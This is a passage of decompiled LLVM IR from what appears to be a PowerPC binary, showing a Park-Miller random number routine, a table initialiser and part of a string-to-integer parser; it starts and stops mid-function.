dec_label_pc_100084c0:                            ; preds = %dec_label_pc_10008450, %dec_label_pc_100084b8
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10008494, { 1, 0 }
  uselistorder i32 %v1_1000847c, { 1, 0 }
  uselistorder i32 %v3_10008470, { 1, 0, 2 }
  uselistorder i32 %v1_1000845c, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100084c0, { 1, 0 }
  uselistorder label %dec_label_pc_100084b8, { 2, 0, 1 }
}

define i32 @function_100084c8() local_unnamed_addr {
dec_label_pc_100084c8:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100084c8 = load i32, i32* @lr, align 4
  %v0_100084d4 = load i32, i32* @r4, align 4
  store i32 %v0_100084d4, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_100084e0 = add i32 %v0_100084d4, 12
  %v2_100084e0 = inttoptr i32 %v1_100084e0 to i32*
  %v3_100084e0 = load i32, i32* %v2_100084e0, align 4
  %v2_100084e4 = icmp ugt i32 %v3_100084e0, 4
  br i1 %v2_100084e4, label %dec_label_pc_10008594, label %dec_label_pc_100084ec

dec_label_pc_100084ec:                            ; preds = %dec_label_pc_100084c8
  %v0_100084ec = load i32, i32* @r3, align 4
  %v3_100084ec = icmp eq i32 %v0_100084ec, 0
  %v1_100084f0 = add i32 %v0_100084d4, 8
  %v2_100084f0 = inttoptr i32 %v1_100084f0 to i32*
  %v3_100084f0 = load i32, i32* %v2_100084f0, align 4
  store i32 %v3_100084f0, i32* %r10.global-to-local, align 4
  br i1 %v3_100084ec, label %dec_label_pc_100084f8, label %dec_label_pc_100084fc

dec_label_pc_100084f8:                            ; preds = %dec_label_pc_100084ec
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_100084fc

dec_label_pc_100084fc:                            ; preds = %dec_label_pc_100084ec, %dec_label_pc_100084f8
  %v0_10008500 = phi i32 [ %v0_100084ec, %dec_label_pc_100084ec ], [ 1, %dec_label_pc_100084f8 ]
  %v3_100084fc = icmp eq i32 %v3_100084e0, 0
  %v2_10008500 = inttoptr i32 %v3_100084f0 to i32*
  store i32 %v0_10008500, i32* %v2_10008500, align 4
  br i1 %v3_100084fc, label %dec_label_pc_10008590, label %dec_label_pc_10008508

dec_label_pc_10008508:                            ; preds = %dec_label_pc_100084fc
  %v0_10008508 = load i32, i32* @r30, align 4
  %v1_10008508 = add i32 %v0_10008508, 16
  %v2_10008508 = inttoptr i32 %v1_10008508 to i32*
  %v3_10008508 = load i32, i32* %v2_10008508, align 4
  store i32 %v3_10008508, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10008520 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10008508, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10008508, 0
  br i1 %tmp18, label %dec_label_pc_1000855c.preheader, label %dec_label_pc_1000855c.preheader.thread

dec_label_pc_1000855c.preheader.thread:           ; preds = %dec_label_pc_10008508
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008560

dec_label_pc_1000855c.preheader:                  ; preds = %dec_label_pc_10008508
  %v1_1000855c2 = add i32 %v3_10008508, -1
  store i32 %v1_1000855c2, i32* %ctr.global-to-local, align 4
  %v2_1000855c3 = icmp eq i32 %v1_1000855c2, 0
  br i1 %v2_1000855c3, label %dec_label_pc_10008560, label %dec_label_pc_10008538

dec_label_pc_10008538:                            ; preds = %dec_label_pc_1000855c.preheader, %dec_label_pc_10008558.dec_label_pc_10008538_crit_edge
  %v1_10008558 = phi i32 [ %v2_10008558, %dec_label_pc_10008558.dec_label_pc_10008538_crit_edge ], [ %v0_10008520, %dec_label_pc_1000855c.preheader ]
  %v1_10008538 = phi i32 [ %v1_10008538.pre, %dec_label_pc_10008558.dec_label_pc_10008538_crit_edge ], [ 127773, %dec_label_pc_1000855c.preheader ]
  %v0_10008538 = load i32, i32* @r3, align 4
  %v2_10008538 = sdiv i32 %v0_10008538, %v1_10008538
  %v2_1000853c = mul i32 %v2_10008538, %v1_10008538
  %v2_10008540 = sub i32 %v0_10008538, %v2_1000853c
  %v1_10008544 = mul i32 %v2_10008538, 2836
  store i32 %v1_10008544, i32* %r0.global-to-local, align 4
  %v1_10008548 = mul i32 %v2_10008540, 16807
  %v2_1000854c = sub i32 %v1_10008548, %v1_10008544
  store i32 %v2_1000854c, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1000854c, -1
  br i1 %tmp19, label %dec_label_pc_10008558, label %dec_label_pc_10008554

dec_label_pc_10008554:                            ; preds = %dec_label_pc_10008538
  %v1_10008554 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008554 = add i32 %v1_10008554, %v2_1000854c
  store i32 %v2_10008554, i32* @r3, align 4
  br label %dec_label_pc_10008558

dec_label_pc_10008558:                            ; preds = %dec_label_pc_10008538, %dec_label_pc_10008554
  %v0_10008558 = phi i32 [ %v2_1000854c, %dec_label_pc_10008538 ], [ %v2_10008554, %dec_label_pc_10008554 ]
  %v2_10008558 = add i32 %v1_10008558, 4
  %v3_10008558 = inttoptr i32 %v2_10008558 to i32*
  store i32 %v0_10008558, i32* %v3_10008558, align 4
  %v0_1000855c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000855c = add i32 %v0_1000855c, -1
  store i32 %v1_1000855c, i32* %ctr.global-to-local, align 4
  %v2_1000855c = icmp eq i32 %v1_1000855c, 0
  br i1 %v2_1000855c, label %dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge, label %dec_label_pc_10008558.dec_label_pc_10008538_crit_edge

dec_label_pc_10008558.dec_label_pc_10008538_crit_edge: ; preds = %dec_label_pc_10008558
  %v1_10008538.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008538

dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge: ; preds = %dec_label_pc_10008558
  %v0_10008560.pre = load i32, i32* @r30, align 4
  %v0_10008564.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10008568.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008560

dec_label_pc_10008560:                            ; preds = %dec_label_pc_1000855c.preheader.thread, %dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge, %dec_label_pc_1000855c.preheader
  %v0_10008568 = phi i32 [ %v0_10008568.pre, %dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge ], [ %v0_10008520, %dec_label_pc_1000855c.preheader ], [ %v0_10008520, %dec_label_pc_1000855c.preheader.thread ]
  %v0_10008564 = phi i32 [ %v0_10008564.pre, %dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge ], [ %v3_10008508, %dec_label_pc_1000855c.preheader ], [ %v3_10008508, %dec_label_pc_1000855c.preheader.thread ]
  %v1_10008568 = phi i32 [ %v0_10008560.pre, %dec_label_pc_1000855c.dec_label_pc_10008560_crit_edge ], [ %v0_10008508, %dec_label_pc_1000855c.preheader ], [ %v0_10008508, %dec_label_pc_1000855c.preheader.thread ]
  %v1_10008560 = add i32 %v1_10008568, 20
  %v2_10008560 = inttoptr i32 %v1_10008560 to i32*
  %v3_10008560 = load i32, i32* %v2_10008560, align 4
  store i32 %v3_10008560, i32* %r0.global-to-local, align 4
  %v1_10008564 = mul i32 %v0_10008564, 10
  store i32 %v1_10008564, i32* %r31.global-to-local, align 4
  %v2_10008568 = add i32 %v1_10008568, 4
  %v3_10008568 = inttoptr i32 %v2_10008568 to i32*
  store i32 %v0_10008568, i32* %v3_10008568, align 4
  %v0_1000856c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000856c = mul i32 %v0_1000856c, 4
  %v0_10008570 = load i32, i32* %r10.global-to-local, align 4
  %v2_10008570 = add i32 %v0_10008570, %v1_1000856c
  store i32 %v2_10008570, i32* %r0.global-to-local, align 4
  %v1_10008574 = load i32, i32* @r30, align 4
  %v2_10008574 = inttoptr i32 %v1_10008574 to i32*
  store i32 %v2_10008570, i32* %v2_10008574, align 4
  %v2_10008588 = ptrtoint i32* %stack_var_-24 to i32
  %v0_1000858021 = load i32, i32* %r31.global-to-local, align 4
  %v1_1000858022 = add i32 %v0_1000858021, -1
  store i32 %v1_1000858022, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1000858022, -1
  br i1 %tmp2025, label %dec_label_pc_1000857c, label %dec_label_pc_10008590

dec_label_pc_1000857c:                            ; preds = %dec_label_pc_10008560, %dec_label_pc_1000857c
  %v0_1000858426 = load i32, i32* @r30, align 4
  %v2_1000857c = inttoptr i32 %v0_1000858426 to i32*
  %v3_1000857c = call i32 @function_10008438(i32* %v2_1000857c, i32 %v2_10008588)
  %v0_10008580 = load i32, i32* @r31, align 4
  %v1_10008580 = add i32 %v0_10008580, -1
  store i32 %v1_10008580, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10008580, -1
  br i1 %tmp20, label %dec_label_pc_1000857c, label %dec_label_pc_10008590

dec_label_pc_10008590:                            ; preds = %dec_label_pc_10008560, %dec_label_pc_1000857c, %dec_label_pc_100084fc
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008594

dec_label_pc_10008594:                            ; preds = %dec_label_pc_100084c8, %dec_label_pc_10008590
  %v0_10008594 = phi i32 [ -1, %dec_label_pc_100084c8 ], [ 0, %dec_label_pc_10008590 ]
  store i32 %v0_100084c8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008594

; uselistorder directives
  uselistorder i32 %v1_1000855c, { 1, 0 }
  uselistorder i32 %v2_10008558, { 1, 0 }
  uselistorder i32 %v2_1000854c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008538, { 1, 0 }
  uselistorder i32 %v0_10008520, { 1, 2, 0 }
  uselistorder i32 %v3_10008508, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_10008594, { 1, 0 }
  uselistorder label %dec_label_pc_10008590, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000857c, { 1, 0 }
  uselistorder label %dec_label_pc_10008560, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008558, { 1, 0 }
  uselistorder label %dec_label_pc_10008538, { 1, 0 }
  uselistorder label %dec_label_pc_100084fc, { 1, 0 }
}

define i32 @function_100085ac(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_100085ac:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100085ac = icmp ugt i32 %arg2, 127
  %v0_100085b4 = load i32, i32* @lr, align 4
  store i32 %v0_100085b4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v1_100085c0 = sub i32 255, %arg2
  %v2_100085c0 = sub i32 -1, %arg2
  %not.v5_100085c0 = icmp ugt i32 %v1_100085c0, %v2_100085c0
  %v6_100085c4 = sext i1 %not.v5_100085c0 to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_100085cc = add i32 %tmp, 4
  store i32 %v1_100085cc, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ec68.270 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_100085e4 = sub nsw i32 3, %v6_100085c4
  store i32 %v1_100085e4, i32* @r31, align 4
  br i1 %v2_100085ac, label %dec_label_pc_1000860c, label %dec_label_pc_100085ec

dec_label_pc_100085ec:                            ; preds = %dec_label_pc_100085ac
  %v2_100085d8 = icmp ugt i32 %arg2, 31
  %v1_100085ec = sub i32 63, %arg2
  %not.v5_100085ec = icmp ugt i32 %v1_100085ec, %v2_100085c0
  %v6_100085f0 = sext i1 %not.v5_100085ec to i32
  %v1_100085f8 = sub nsw i32 1, %v6_100085f0
  store i32 %v1_100085f8, i32* @r31, align 4
  br i1 %v2_100085d8, label %dec_label_pc_1000860c, label %dec_label_pc_10008600

dec_label_pc_10008600:                            ; preds = %dec_label_pc_100085ec
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_1000866c, label %dec_label_pc_1000860c

dec_label_pc_1000860c:                            ; preds = %dec_label_pc_10008600, %dec_label_pc_100085ec, %dec_label_pc_100085ac
  %v0_1000860c = phi i32 [ 0, %dec_label_pc_10008600 ], [ %v1_100085f8, %dec_label_pc_100085ec ], [ %v1_100085e4, %dec_label_pc_100085ac ]
  %v1_1000860c = mul nsw i32 %v0_1000860c, 4
  store i32 %v1_1000860c, i32* %r0.global-to-local, align 4
  %v2_10008610 = add i32 %arg3, 12
  %v3_10008610 = inttoptr i32 %v2_10008610 to i32*
  store i32 %v0_1000860c, i32* %v3_10008610, align 4
  %v0_10008614 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008614 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008614 = add i32 %v1_10008614, %v0_10008614
  store i32 %v2_10008614, i32* %r9.global-to-local, align 4
  %v3_10008618 = inttoptr i32 %v2_10008614 to i32*
  %v4_10008618 = load i32, i32* %v3_10008618, align 4
  store i32 %v4_10008618, i32* %r0.global-to-local, align 4
  %v1_1000861c = add i32 %v2_10008614, 20
  %v2_1000861c = inttoptr i32 %v1_1000861c to i32*
  %v3_1000861c = load i32, i32* %v2_1000861c, align 4
  store i32 %v3_1000861c, i32* %r9.global-to-local, align 4
  %v1_10008620 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008620 = add i32 %v1_10008620, 20
  %v3_10008620 = inttoptr i32 %v2_10008620 to i32*
  store i32 %v4_10008618, i32* %v3_10008620, align 4
  %v0_10008624 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008624 = mul i32 %v0_10008624, 4
  store i32 %v1_10008624, i32* %r0.global-to-local, align 4
  %v0_10008628 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008628 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008628 = add i32 %v1_10008628, 8
  %v3_10008628 = inttoptr i32 %v2_10008628 to i32*
  store i32 %v0_10008628, i32* %v3_10008628, align 4
  %v0_1000862c = load i32, i32* %r29.global-to-local, align 4
  %v1_1000862c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000862c = add i32 %v1_1000862c, %v0_1000862c
  store i32 %v2_1000862c, i32* %r0.global-to-local, align 4
  %v0_10008630 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008630 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008630 = add i32 %v1_10008630, 16
  %v3_10008630 = inttoptr i32 %v2_10008630 to i32*
  store i32 %v0_10008630, i32* %v3_10008630, align 4
  %v0_10008634 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008634 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008634 = add i32 %v1_10008634, 24
  %v3_10008634 = inttoptr i32 %v2_10008634 to i32*
  store i32 %v0_10008634, i32* %v3_10008634, align 4
  store i32 268469820, i32* @lr, align 4
  %v0_10008638 = call i32 @function_100084c8()
  %v0_1000863c = load i32, i32* @r31, align 4
  %v3_1000863c = icmp eq i32 %v0_1000863c, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10008648 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008648 = inttoptr i32 %v1_10008648 to i32*
  store i32 0, i32* %v2_10008648, align 4
  br i1 %v3_1000863c, label %dec_label_pc_10008680, label %dec_label_pc_10008650

dec_label_pc_10008650:                            ; preds = %dec_label_pc_1000860c
  %v0_10008650 = load i32, i32* @r30, align 4
  %v1_10008650 = add i32 %v0_10008650, 4
  %v2_10008650 = inttoptr i32 %v1_10008650 to i32*
  %v3_10008650 = load i32, i32* %v2_10008650, align 4
  %v0_10008654 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008654 = sub i32 %v3_10008650, %v0_10008654
  %v4_10008658 = sdiv i32 %v2_10008654, 4
  %v1_1000865c = mul i32 %v4_10008658, 5
  %v1_10008660 = load i32, i32* @r31, align 4
  %v2_10008660 = add i32 %v1_1000865c, %v1_10008660
  store i32 %v2_10008660, i32* %r0.global-to-local, align 4
  %v1_10008664 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008664 = inttoptr i32 %v1_10008664 to i32*
  store i32 %v2_10008660, i32* %v2_10008664, align 4
  br label %dec_label_pc_10008680

dec_label_pc_1000866c:                            ; preds = %dec_label_pc_10008600
  %v0_1000866c = call i32 @function_10004b48()
  store i32 %v0_1000866c, i32* %r3.global-to-local, align 4
  %v0_10008670 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008670 = inttoptr i32 %v0_1000866c to i32*
  store i32 %v0_10008670, i32* %v2_10008670, align 4
  %v0_10008674 = call i32 @function_10004b48()
  %v0_10008678 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008678 = inttoptr i32 %v0_10008674 to i32*
  store i32 %v0_10008678, i32* %v2_10008678, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008680

dec_label_pc_10008680:                            ; preds = %dec_label_pc_1000860c, %dec_label_pc_10008650, %dec_label_pc_1000866c
  store i32 %v0_100085b4, i32* %r0.global-to-local, align 4
  %v0_10008690 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008690

; uselistorder directives
  uselistorder i32 %v2_10008614, { 1, 0, 2 }
  uselistorder i32 %v0_1000860c, { 1, 0 }
  uselistorder i32 %v2_100085c0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_1000ec68.270 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_10008680, { 2, 1, 0 }
}

define i32 @function_10008694(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008694:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_100086cc = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_100086d8

dec_label_pc_100086d4:                            ; preds = %dec_label_pc_100086d8
  %v1_100086d4 = add i32 %v0_1000870c, 1
  store i32 %v1_100086d4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100086d8

dec_label_pc_100086d8:                            ; preds = %dec_label_pc_10008694, %dec_label_pc_100086d4
  %v0_1000870c = phi i32 [ %tmp, %dec_label_pc_10008694 ], [ %v1_100086d4, %dec_label_pc_100086d4 ]
  %v1_100086d8 = inttoptr i32 %v0_1000870c to i8*
  %v2_100086d8 = load i8, i8* %v1_100086d8, align 1
  %v3_100086d8 = zext i8 %v2_100086d8 to i32
  %v1_100086dc = mul nuw nsw i32 %v3_100086d8, 2
  %v2_100086e0 = add i32 %v1_100086dc, %v3_100086cc
  %v3_100086e0 = inttoptr i32 %v2_100086e0 to i16*
  %v4_100086e0 = load i16, i16* %v3_100086e0, align 2
  %v1_100086e4 = and i16 %v4_100086e0, 32
  %v3_100086e4 = icmp eq i16 %v1_100086e4, 0
  br i1 %v3_100086e4, label %dec_label_pc_100086ec, label %dec_label_pc_100086d4

dec_label_pc_100086ec:                            ; preds = %dec_label_pc_100086d8
  %v3_100086ec = icmp eq i8 %v2_100086d8, 43
  br i1 %v3_100086ec, label %dec_label_pc_1000870c, label %dec_label_pc_100086f4

dec_label_pc_100086f4:                            ; preds = %dec_label_pc_100086ec
  %v3_100086f4 = icmp eq i8 %v2_100086d8, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_100086f4, label %dec_label_pc_1000870c, label %dec_label_pc_10008710

dec_label_pc_1000870c:                            ; preds = %dec_label_pc_100086ec, %dec_label_pc_100086f4
  %storemerge = phi i32 [ 1, %dec_label_pc_100086f4 ], [ 0, %dec_label_pc_100086ec ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_1000870c = add i32 %v0_1000870c, 1
  store i32 %v1_1000870c, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008710

dec_label_pc_10008710:                            ; preds = %dec_label_pc_100086f4, %dec_label_pc_1000870c
  %v1_10008710 = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_10008710 = icmp eq i32 %v1_10008710, 0
  br i1 %v4_10008710, label %dec_label_pc_1000871c, label %dec_label_pc_10008710.dec_label_pc_10008758_crit_edge

dec_label_pc_10008710.dec_label_pc_10008758_crit_edge: ; preds = %dec_label_pc_10008710
  %v0_10008758.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008758

dec_label_pc_1000871c:                            ; preds = %dec_label_pc_10008710
  %v0_1000871c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000871c = inttoptr i32 %v0_1000871c to i8*
  %v2_1000871c = load i8, i8* %v1_1000871c, align 1
  %v0_10008720 = load i32, i32* %r30.global-to-local, align 4
  %v1_10008720 = add i32 %v0_10008720, 10
  store i32 %v1_10008720, i32* %r30.global-to-local, align 4
  %v3_10008724 = icmp eq i8 %v2_1000871c, 48
  br i1 %v3_10008724, label %dec_label_pc_1000872c, label %dec_label_pc_1000874c

dec_label_pc_1000872c:                            ; preds = %dec_label_pc_1000871c
  %v1_1000872c = add i32 %v0_1000871c, 1
  %v2_1000872c = inttoptr i32 %v1_1000872c to i8*
  %v3_1000872c = load i8, i8* %v2_1000872c, align 1
  %v4_1000872c = zext i8 %v3_1000872c to i32
  store i32 %v1_1000872c, i32* %r31.global-to-local, align 4
  %v1_10008730 = add i32 %v0_10008720, 8
  store i32 %v1_10008730, i32* %r30.global-to-local, align 4
  %v1_10008734 = or i32 %v4_1000872c, 32
  %v3_1000873c = icmp eq i32 %v1_10008734, 120
  br i1 %v3_1000873c, label %dec_label_pc_10008744, label %dec_label_pc_1000874c

dec_label_pc_10008744:                            ; preds = %dec_label_pc_1000872c
  %v1_10008744 = mul i32 %v1_10008730, 2
  store i32 %v1_10008744, i32* %r30.global-to-local, align 4
  %v1_10008748 = add i32 %v0_1000871c, 2
  store i32 %v1_10008748, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000874c

dec_label_pc_1000874c:                            ; preds = %dec_label_pc_1000872c, %dec_label_pc_1000871c, %dec_label_pc_10008744
  %v0_1000880015 = phi i32 [ %v1_1000872c, %dec_label_pc_10008744 ], [ %tmp, %dec_label_pc_1000871c ], [ %v1_1000872c, %dec_label_pc_1000872c ]
  %v0_1000874c = phi i32 [ %v1_10008744, %dec_label_pc_10008744 ], [ %v1_10008720, %dec_label_pc_1000871c ], [ %v1_10008730, %dec_label_pc_1000872c ]
  %tmp22 = icmp slt i32 %v0_1000874c, 17
  br i1 %tmp22, label %dec_label_pc_10008758, label %dec_label_pc_10008754

dec_label_pc_10008754:                            ; preds = %dec_label_pc_1000874c
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008758

dec_label_pc_10008758:                            ; preds = %dec_label_pc_10008710.dec_label_pc_10008758_crit_edge, %dec_label_pc_1000874c, %dec_label_pc_10008754
  %v0_1000880014 = phi i32 [ %tmp, %dec_label_pc_10008710.dec_label_pc_10008758_crit_edge ], [ %v0_1000880015, %dec_label_pc_1000874c ], [ %v0_1000880015, %dec_label_pc_10008754 ]
  %v1_1000876c = phi i32 [ %v0_10008758.pre, %dec_label_pc_10008710.dec_label_pc_10008758_crit_edge ], [ %v0_1000874c, %dec_label_pc_1000874c ], [ 16, %dec_label_pc_10008754 ]
  %v1_10008758 = add i32 %v1_1000876c, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10008760 = icmp ugt i32 %v1_10008758, 34
  br i1 %v2_10008760, label %dec_label_pc_100087f8, label %dec_label_pc_10008768

dec_label_pc_10008768:                            ; preds = %dec_label_pc_10008758
  %v2_1000876c = udiv i32 -1, %v1_1000876c
  store i32 %v2_1000876c, i32* %r29.global-to-local, align 4
  %v2_10008770 = mul i32 %v2_1000876c, %v1_1000876c
  %v1_10008774 = sub i32 -1, %v2_10008770
  %v1_10008778 = urem i32 %v1_10008774, 256
  store i32 %v1_10008778, i32* %r27.global-to-local, align 4
  %v0_10008784.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008784

dec_label_pc_10008780:                            ; preds = %dec_label_pc_100087ec, %dec_label_pc_100087d4
  %v1_10008788.pre = phi i32 [ %v1_1000878c, %dec_label_pc_100087ec ], [ %v1_10008788.pre.pre, %dec_label_pc_100087d4 ]
  %v0_10008788.pre = phi i32 [ %v2_100087f0, %dec_label_pc_100087ec ], [ %v0_10008788.pre.pre, %dec_label_pc_100087d4 ]
  %v0_10008780 = phi i32 [ %v1_10008790, %dec_label_pc_100087ec ], [ %v0_10008780.pre, %dec_label_pc_100087d4 ]
  br label %dec_label_pc_10008784

dec_label_pc_10008784:                            ; preds = %dec_label_pc_10008768, %dec_label_pc_10008780
  %v0_1000880012 = phi i32 [ %v0_1000880014, %dec_label_pc_10008768 ], [ %v0_10008780, %dec_label_pc_10008780 ]
  %v0_10008790 = phi i32 [ %v0_10008784.pre, %dec_label_pc_10008768 ], [ %v0_10008780, %dec_label_pc_10008780 ]
  %v1_1000878c = phi i32 [ %v2_1000876c, %dec_label_pc_10008768 ], [ %v1_10008788.pre, %dec_label_pc_10008780 ]
  %v0_100087ec = phi i32 [ 0, %dec_label_pc_10008768 ], [ %v0_10008788.pre, %dec_label_pc_10008780 ]
  %v1_10008784 = inttoptr i32 %v0_10008790 to i8*
  %v2_10008784 = load i8, i8* %v1_10008784, align 1
  %v3_10008784 = zext i8 %v2_10008784 to i32
  %v3_10008788 = icmp ugt i32 %v0_100087ec, %v1_1000878c
  %v1_10008790 = add i32 %v0_10008790, 1
  store i32 %v1_10008790, i32* %r31.global-to-local, align 4
  %v1_10008794 = add nsw i32 %v3_10008784, -48
  %v1_10008798 = or i32 %v3_10008784, 32
  %v1_1000879c = urem i32 %v1_10008794, 256
  %tmp23 = icmp ult i32 %v1_1000879c, 10
  br i1 %tmp23, label %dec_label_pc_100087bc, label %dec_label_pc_100087ac

dec_label_pc_100087ac:                            ; preds = %dec_label_pc_10008784
  %tmp24 = icmp ult i32 %v1_10008798, 97
  br i1 %tmp24, label %dec_label_pc_100087bc, label %dec_label_pc_100087b8

dec_label_pc_100087b8:                            ; preds = %dec_label_pc_100087ac
  %v1_100087ac = add nsw i32 %v1_10008798, -87
  %v1_100087b8 = urem i32 %v1_100087ac, 256
  br label %dec_label_pc_100087bc

dec_label_pc_100087bc:                            ; preds = %dec_label_pc_100087ac, %dec_label_pc_10008784, %dec_label_pc_100087b8
  %v1_100087f0 = phi i32 [ 40, %dec_label_pc_100087ac ], [ %v1_1000879c, %dec_label_pc_10008784 ], [ %v1_100087b8, %dec_label_pc_100087b8 ]
  %v1_100087bc = load i32, i32* %r30.global-to-local, align 4
  %v2_100087bc = icmp slt i32 %v1_100087f0, %v1_100087bc
  br i1 %v2_100087bc, label %dec_label_pc_100087c4, label %dec_label_pc_100087f8

dec_label_pc_100087c4:                            ; preds = %dec_label_pc_100087bc
  br i1 %v3_10008788, label %dec_label_pc_100087d4, label %dec_label_pc_100087c8

dec_label_pc_100087c8:                            ; preds = %dec_label_pc_100087c4
  %v1_100087c8 = load i32, i32* %r27.global-to-local, align 4
  %v0_100087cc.not = icmp ne i32 %v0_100087ec, %v1_1000878c
  %tmp25 = icmp ule i32 %v1_100087f0, %v1_100087c8
  %or.cond = or i1 %tmp25, %v0_100087cc.not
  br i1 %or.cond, label %dec_label_pc_100087ec, label %dec_label_pc_100087d4

dec_label_pc_100087d4:                            ; preds = %dec_label_pc_100087c8, %dec_label_pc_100087c4
  %v0_100087d4 = call i32 @function_10004b48()
  %v0_100087d8 = load i32, i32* %r28.global-to-local, align 4
  %v1_100087d8 = load i32, i32* %r26.global-to-local, align 4
  %v2_100087d8 = and i32 %v1_100087d8, %v0_100087d8
  store i32 %v2_100087d8, i32* %r28.global-to-local, align 4
  store i32 -1, i32* %r8.global-to-local, align 4
  %v2_100087e4 = inttoptr i32 %v0_100087d4 to i32*
